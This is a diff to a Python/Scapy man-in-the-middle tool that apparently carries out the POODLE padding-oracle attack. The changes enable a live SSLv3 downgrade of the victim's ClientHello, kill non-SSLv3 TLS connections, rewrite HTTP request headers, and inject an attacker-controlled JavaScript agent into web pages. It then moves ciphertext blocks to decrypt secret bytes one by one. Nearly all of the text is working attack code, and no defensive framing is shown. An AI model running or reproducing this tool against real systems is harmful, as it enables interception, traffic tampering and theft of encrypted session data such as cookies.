@@ -34,10 +34,11 @@ data_padding_size_needed = 0
 block_size = None
 
 # For exploit stage
-block_to_move = 1
+block_to_move = 60 
 current_offset = 0
 secret = {}
 count = 0
+number_of_requests = {}
 
 dns_mapping = {}
 option_request_length = None
@@ -48,10 +49,11 @@ skip_first_response = True
 load_layer('tls')
 
 config = json.load(open('config.json'))
+log_file = open('intercept.log', 'w')
 
 # Load the variables into the JavaScript agent that will be run on the target
-js_client_html = open('poodle.js', 'r').read()
-js_client_html = js_client_html.replace('attackerIp', '"' + config['attacker'] + '"').replace('targetUrl', '"https://' + config['server'] + '"')
+js_client_html = open('agent.js', 'r').read()
+js_client_html = js_client_html.replace('attackerIp', '"' + config['attacker'] + '"').replace('targetUrl', '"https://' + config['server'] + '"').replace('\n', '').replace('\r', '').replace('\t', '')
 
 def get_field(layer, field_name):
 	return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))
@@ -62,19 +64,26 @@ def copy_block_to_end(arr, copy_index):
 def modify_and_send_packet(packet, pkt):
 	del pkt[IP].chksum
 	del pkt[TCP].chksum
+	pkt[IP].len = len(pkt)
 	packet.set_payload(bytes(pkt))
 	packet.accept()
 
-with output(output_type='list', initial_len=5) as output_list:
+def log(text):
+	if DEBUG:
+		print(text)
+	log_file.write(text + '\n')
+
+with output(output_type='list', initial_len=6) as output_list:
 
 	output_list[0] = 'Waiting for agent...'
 
-	def print_state(ciphertext_length = None, math_str = None):
-		current_index = (((block_to_move + 1) * block_size) - current_offset) if block_size is not None else 0
-		
-		output_list[0] = "Block Size: {}, POST Request length: {}, OPTION Request length: {}".format(block_size, post_request_length, option_request_length)
+	def get_current_index():
+		if block_size:
+			return ((block_to_move + 1) * block_size) - current_offset
+		return 0
 
-		output_list[1] = "Working on decrypting byte {} - Request #{}".format(current_index, count)
+	def print_state(ciphertext_length = None, math_str = None):
+		update_state_progress()
 
 		output_list[2] = "Last Byte Decrypted: {}".format(math_str) if math_str is not None else ''
 
@@ -85,6 +94,20 @@ with output(output_type='list', initial_len=5) as output_list:
 		segment = int(percent_complete * 50)
 		progress_bar = ("#" * segment) + (" " * (50-segment))
 		output_list[4] = "Progress: [{}] {}%".format(progress_bar, int(percent_complete*100))
+
+		if len(number_of_requests) > 0:
+			output_list[5] = "Average number of requests: {}".format(sum(number_of_requests.values()) / len(number_of_requests))
+		else:
+			output_list[5] = "Average number of requests: N/A"
+
+	def update_state_progress():
+		output_list[0] = "Block Size: {}, POST Request length: {}, OPTION Request length: {}".format(block_size, post_request_length, option_request_length)
+		current_index = get_current_index()
+		try:
+			output_list[1] = "Working on decrypting byte {} - Request #{}".format(current_index, number_of_requests[current_index])
+		except:
+			pass
+		
 		
 	def callback(packet):
 		global block_size
@@ -97,9 +120,9 @@ with output(output_type='list', initial_len=5) as output_list:
 		global option_response_length
 		global skip_first_response
 		global current_offset
-		global count
 		global dns_mapping
 		global server_ip
+		global number_of_requests
 
 		pkt = IP(packet.get_payload())
 
@@ -107,31 +130,33 @@ with output(output_type='list', initial_len=5) as output_list:
 
 			# On outgoing HTTP requests, make sure there is no compression or caching
 			if pkt.src == config['target']:
-				if DEBUG: print("Sending request to " + pkt.dst)
-				raw_http = str(pkt['HTTP']['Raw'].load)
+				log("Sending request to " + pkt.dst)
+				raw_http = pkt['HTTP']['Raw'].load.decode('utf8')
+				if 'GET' in raw_http and len(raw_http) > 0:
 
-				encoding_pattern = 'Accept-Encoding: ([a-z-]+)'
-				encoding_match = re.search(encoding_pattern, raw_http)
-				if encoding_match is not None:
-					raw_http = raw_http.replace('Accept-Encoding: ' + encoding_match.group(), 'Accept-Encoding: identity')
-				else:
-					index = raw_http.find('Host')
-					raw_http = raw_http[:index] + 'Accept-Encoding: identity' + raw_http[:index]
-					
-					
+					encoding_pattern = 'Accept-Encoding: ([a-z-,]+)'
+					encoding_match = re.search(encoding_pattern, raw_http)
+					if encoding_match is not None:
+						raw_http = raw_http.replace(encoding_match.group(), 'Accept-Encoding: identity')
+					else:
+						index = raw_http.find('\r\n\r\n')
+						if index > 0:
+							raw_http = raw_http[:index] + '\r\nAccept-Encoding: identity' + raw_http[:index]
 
-				cache_pattern = 'Cache-Control: ([a-z-]+)'
-				cache_match = re.search(cache_pattern, raw_http)
-				if cache_match is not None:
-					raw_http = raw_http.replace('Cache-Control: ' + cache_match.group(), 'Cache-Control: no-cache')
-				else:
-					index = raw_http.find('Host')
-					raw_http = raw_http[:index] + 'Cache-Control: no-cache' + raw_http[:index]
+					cache_pattern = 'Cache-Control: ([a-z-=0-9]+)'
+					cache_match = re.search(cache_pattern, raw_http)
+					if cache_match is not None:
+						raw_http = raw_http.replace(cache_match.group(), 'Cache-Control: no-cache')
+					else:
+						index = raw_http.find('\r\n\r\n')
+						if index > 0:
+							raw_http = raw_http[:index] + '\r\nCache-Control: no-cache' + raw_http[:index]
 
-				pkt['HTTP']['Raw'].load = raw_http
+					#pkt[HTTP][Raw].load = bytes(raw_http, 'utf8')
+					log("Sent: " + str(raw_http))
 
-				modify_and_send_packet(packet, pkt)
-				return
+					modify_and_send_packet(packet, pkt)
+					return
 
 				#pkt.getlayer(HTTP).getlayer(Raw).load = bytes(str(pkt.getlayer(HTTP).getlayer(Raw).load).replace('Accept-Encoding: gzip', 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache'))
 		#		pkt.getlayer(HTTP).show()
@@ -143,26 +168,36 @@ with output(output_type='list', initial_len=5) as output_list:
 				#pkt['HTTP']['HTTP Request'].fields['Headers'] = str_headers
 
 			# On return packets, inject the JS client
-			elif pkt.dst == config['target'] and 'HTTP' in pkt:
-				if DEBUG: print("HTTP Payload: " + str(pkt['HTTP']['Raw'].load))
-				pkt['HTTP']['Raw'].load += bytes(js_client_html, 'utf8')
-
-				modify_and_send_packet(packet, pkt)
+			elif pkt.dst == config['target'] and HTTP in pkt:
+				raw_http = pkt[HTTP][Raw].load.decode('utf8').replace('\\r\\n', '') 
+				index = raw_http.find('</body>')
+				if index > 0:
+					raw_http = bytes(raw_http[:index] + js_client_html + raw_http[index:], 'utf8')
+					#pkt[HTTP][Raw].load = raw_http
+					modify_and_send_packet(packet, pkt)
+				else:
+					packet.accept()
 				return
 
 		if DEBUG and pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
-			print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
+			log("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
 
 		if pkt.src == config['target'] and pkt.dst == server_ip and TCP in pkt:
 
 			# TLS Downgrade
-			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "handshake" and get_field(pkt['TLS'], 'version') != 'SSLv3' and False:
-				# 0x0300 is SSLv3
-				pkt[TCP].payload[1] = 0x03
-				pkt[TCP].payload[2] = 0x00
-				#pkt[TCP].flags = 'FA'
-				#pkt[TCP].len = 0
-				#pkt[TCP].remove_payload()
+			if TLS in pkt and get_field(pkt['TLS'], 'version') != 'SSLv3':
+				# Change the client handshake to offer SSLv3
+				if get_field(pkt.getlayer(TLS), 'type') == "handshake":
+					# 0x0300 is SSLv3
+					pkt[TLS].version = 0x0300
+					pkt[TLS]['TLS Handshake - Client Hello'].version = 0x0300
+
+				# Otherwise, if we are sending data over TLS, just end the connection
+				else:
+					pkt[TCP].flags = 'FA'
+					pkt[TCP].len = 0
+					pkt[TCP].remove_payload()
+
 				modify_and_send_packet(packet, pkt)
 				return
 
@@ -182,26 +217,26 @@ with output(output_type='list', initial_len=5) as output_list:
 
 				# Don't modify pre-flight check
 				if option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length):
-					if DEBUG: print("Skipping OPTION Request")
+					log("Skipping OPTION Request")
 					if option_request_length is None:
-						if DEBUG: print("OPTION Request Length: " + str(len(pkt)))
+						log("OPTION Request Length: " + str(len(pkt)))
 						option_request_length = len(pkt)
 					packet.accept()
 					return
 				elif post_request_length is None:
-					if DEBUG: print("POST Request Length: " + str(len(pkt)))
+					log("POST Request Length: " + str(len(pkt)))
 					post_request_length = len(pkt)
 
 				# Stage 1: The JS client is sending packets of increasing length
 				if block_size is None:
 
-					if DEBUG: print("Got request length " + str(len(pkt)))
+					log("Got request length " + str(len(pkt)))
 					if ciphertext_length > 0:
 						data_padding_size_needed += 1
 						if len(pkt) > ciphertext_length:
 							block_size = len(pkt) - ciphertext_length
-							print_state()
-							if DEBUG: print("Found block size: " + str(block_size))
+							print_state(ciphertext_length)
+							log("Found block size: " + str(block_size))
 					else:
 						ciphertext_length = len(pkt)
 
@@ -209,11 +244,12 @@ with output(output_type='list', initial_len=5) as output_list:
 				else:
 
 					if len(pkt) > post_request_length:
-						if DEBUG: print("New POST Request Length: " + str(len(pkt)))
+						log("New POST Request Length: " + str(len(pkt)))
 						post_request_length = len(pkt)
 
-					count += 1
-					if DEBUG: print("Copying block to end")
+					number_of_requests[get_current_index()] += 1
+					update_state_progress()
+					log("Copying block to end")
 
 					start_index = block_size * block_to_move
 					tls_data_start_index = ([i + 5 for i in range(len(bytes(pkt))) if list(bytes(pkt))[i:i+3] == [0x17, 0x03, 0x00]])[-1]
@@ -245,9 +281,9 @@ with output(output_type='list', initial_len=5) as output_list:
 
 				# Ignore response to pre-flight check
 				if option_response_length is None or len(pkt) == option_response_length:
-					if DEBUG: print("Skipping OPTION Response")
+					log("Skipping OPTION Response")
 					if option_response_length is None:
-						if DEBUG: print("OPTION Response length: " + str(len(pkt)))
+						log("OPTION Response length: " + str(len(pkt)))
 						option_response_length = len(pkt)
 					packet.accept()
 					return
@@ -262,15 +298,19 @@ with output(output_type='list', initial_len=5) as output_list:
 					last_block_last_byte = ciphertext[-block_size - 1]
 					decrypted_byte = (block_size - 1) ^ previous_block_last_byte  ^ last_block_last_byte
 					decrypted_byte_index = ((block_to_move + 1) * block_size) - current_offset - 1
+				
+					# Store what was learned
 					secret[decrypted_byte_index] = decrypted_byte
 
-					if not DEBUG:
-						print_state(len(ciphertext), "{} = {} ^ {} ^ {}".format(decrypted_byte, block_size - 1, previous_block_last_byte, last_block_last_byte))
+					# Reset all sessions
+					sessions = {}
+
+					print_state(len(ciphertext), "{} = {} ^ {} ^ {}".format(decrypted_byte, block_size - 1, previous_block_last_byte, last_block_last_byte))
 					
 				else:
-					if DEBUG: print("ciphertext is None")
+					log("ciphertext is None")
 			else:
-				if DEBUG: print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
+				log("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
 				
 
 		# Try to get server IP address from the dns name given in the config file and the DNS traffic we've intercepted
@@ -296,6 +336,8 @@ with output(output_type='list', initial_len=5) as output_list:
 		packet.accept()
 
 	class Handler(BaseHTTPRequestHandler):
+		def log_message(self, format, *args):
+			log(format.format(*args))
 		def add_headers(self):
 			self.send_header("Content-type", "text/plain")
 			self.send_header('Access-Control-Allow-Origin', '*')
@@ -305,7 +347,7 @@ with output(output_type='list', initial_len=5) as output_list:
 			global data_padding_size_needed
 			global current_offset
 			global block_to_move
-			global count
+			global number_of_requests
 			content = None
 
 			while block_size == None:
@@ -315,7 +357,6 @@ with output(output_type='list', initial_len=5) as output_list:
 				output_list[0] = 'Finding Block Size...'
 				content = bytes(str(block_size) + " " + str(int(data_padding_size_needed + 1)), 'utf8')
 			elif self.path == '/offset':
-				count = 0
 				for i in range(block_size):
 					if ((block_to_move + 1) * block_size) - i - 1 not in secret:
 						current_offset = i
@@ -325,6 +366,7 @@ with output(output_type='list', initial_len=5) as output_list:
 					block_to_move += 1
 					current_offset = 0
 					content = bytes('0', 'utf8')
+				number_of_requests[get_current_index()] = 0
 			else:
 				self.send_error(404, "Endpoint does not exist")
 				return
@@ -354,3 +396,5 @@ with output(output_type='list', initial_len=5) as output_list:
 	web_server.shutdown()
 	#web_server.socket.close()
 	web_server_thread.join()
+	
+	log_file.close()
